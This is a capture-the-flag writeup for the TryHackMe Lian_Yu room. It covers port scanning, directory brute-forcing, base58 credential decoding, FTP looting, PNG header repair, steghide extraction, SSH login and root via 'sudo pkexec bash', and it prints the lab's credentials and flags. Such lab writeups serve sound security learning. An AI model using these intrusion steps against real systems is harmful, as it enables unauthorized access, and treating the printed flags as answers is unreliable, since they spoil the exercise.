---
title: TryHackMe - Lian_Yu Writeup
description: My writeup on Lian_Yu box.
categories:
 - tryhackme
tags: tryhackme
---


A really easy box, let's pwn it!

You can find the machine there > [Lian_Yu](https://tryhackme.com/room/lianyu){:target="_blank"}

As always let's start with a nmap scan.

```bash
$ ip=10.10.54.254
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 00:31 EEST
Nmap scan report for 10.10.54.254 (10.10.54.254)
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36004/tcp   status
|   100024  1          36201/udp6  status
|   100024  1          47088/tcp6  status
|_  100024  1          49987/udp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's enumerate port 80, by running `gobuster`.

```bash
$ gobuster dir -q -u http://$ip/ -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster1.txt
/server-status (Status: 403)
/island (Status: 301)
```

Great, when we visit the page and we press "CTRL + A" we can see this :

![](https://i.ibb.co/CHRrSww/Screenshot-6.png)

Probably a username (vigilante) ? Let's save it.

After if we check the hint on tryhackme says directory in numbers & has 4 bytes. So let's generate a custom wordlist with python and run gobuster with it.

```bash
$ python -c 'for i in range(999,9999): print i' > numwordlist.txt
$ gobuster dir -q -u http://$ip/island -w numwordlist.txt -o gobuster2.txt
/2100 (Status: 301)
```

Perfect under this directory we can see this in source code :

`<!-- you can avail your .ticket here but how?   -->`

Let's search for files with `.ticket` extension.

```bash
$ gobuster dir -q -u http://$ip/island/2100/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x ticket -o gobuster3.txt
/green_arrow.ticket (Status: 200)
```

Perfect, we can see this string in webpage : `RTy8yhBQdscX` it's a base58 string.

Let's decode it :

```bash
$ sudo apt-get install base58 -y 
$ echo RTy8yhBQdscX | base58 --decode
!#th3h00d
```

So now we have some creds -> `vigilante:!#th3h00d`, let's use them for FTP.

```bash
$ ftp $ip
Connected to 10.10.54.254.
220 (vsFTPd 3.0.2)
Name (10.10.54.254:root): vigilante
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 .
drwxr-xr-x    4 0        0            4096 May 01 05:38 ..
-rw-------    1 1001     1001           44 May 01 07:13 .bash_history
-rw-r--r--    1 1001     1001          220 May 01 05:38 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01 05:38 .bashrc
-rw-r--r--    1 0        0            2483 May 01 07:07 .other_user
-rw-r--r--    1 1001     1001          675 May 01 05:38 .profile
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp> 
```
Let's download the images + `.other_user` file.

```bash
ftp> get Leave_me_alone.png
local: Leave_me_alone.png remote: Leave_me_alone.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
226 Transfer complete.
511720 bytes received in 5.93 secs (84.2375 kB/s)
ftp> get Queen's_Gambit.png
local: Queen's_Gambit.png remote: Queen's_Gambit.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
226 Transfer complete.
549924 bytes received in 3.39 secs (158.5372 kB/s)
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
226 Transfer complete.
191026 bytes received in 1.08 secs (173.1021 kB/s)
ftp> get .other_user
local: .other_user remote: .other_user
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .other_user (2483 bytes).
226 Transfer complete.
2483 bytes received in 0.00 secs (637.4355 kB/s)
```

File `Leave_me_alone.png` seems broken.

```bash
$ file Leave_me_alone.png 
Leave_me_alone.png: data
```

Let's check the magic bytes of it.

```bash
$ xxd -p Leave_me_alone.png | head -1
58456fae0a0d1a0a0000000d494844520000034d000001db080600000017
```

Isnt `.png` one, let's add the `.png` one.

`89 50 4E 47 0D 0A 1A 0A`

Now we have a `.png` file.

```bash
$ file Leave_me_alone.png 
Leave_me_alone.png: PNG image data, 845 x 475, 8-bit/color RGBA, non-interlaced
```

And gives us the `password` for the steghide. `password -> password` :P

```bash
$ steghide extract -sf aa.jpg 
Enter passphrase: 
wrote extracted data to "ss.zip".
$ unzip ss.zip 
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado                   
$ cat shado 
M3tahuman
```

Great let's check the `.other_user` file now. Gives us this name `Slade` so now we can use them for SSH.

```bash
$ ssh slade@$ip
slade@10.10.54.254's password: 
slade@LianYu:~$ 
```

We're in, let's check `sudo -l` as always.

```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

We can run `pkexec` as root.

`pkexec` -> We can execute a command as another user.

So let's do it.

```bash
slade@LianYu:~$ sudo pkexec bash
root@LianYu:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

Let's read the flags now.

```bash
root@LianYu:~# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

root@LianYu:~# cat /home/slade/user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak
```

See you!
